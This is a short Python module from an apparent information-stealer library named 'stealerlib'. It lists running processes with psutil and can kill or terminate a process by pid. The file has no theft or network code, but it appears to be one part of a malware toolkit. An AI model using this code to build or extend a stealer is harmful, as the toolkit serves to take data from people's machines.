#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/system/processes.py
"""

from stealerlib.system import *


class Processes:
    def __init__(self):
        self.processes = []

    @catch
    def get_processes(self) -> list:
        pids = psutil.pids()

        for pid in pids:
            new_process = self.get_process(pid=pid)
            if new_process:
                self.processes.append(new_process.conv())

        return self.processes

    def get_process(self, pid: int) -> Union[None, SystemTypes.Process]:
        p = psutil.Process(pid)

        process = SystemTypes.Process(
            pid=pid,
            name=p.name(),
            status=p.status(),
            parent=p.parent(),
            children=p.children()
        )

        return process

    @catch
    def kill_process(self, pid: int) -> None:
        p = psutil.Process(pid)
        p.kill()

    @catch
    def terminate_process(self, pid: int) -> None:
        p = psutil.Process(pid)
        p.terminate()
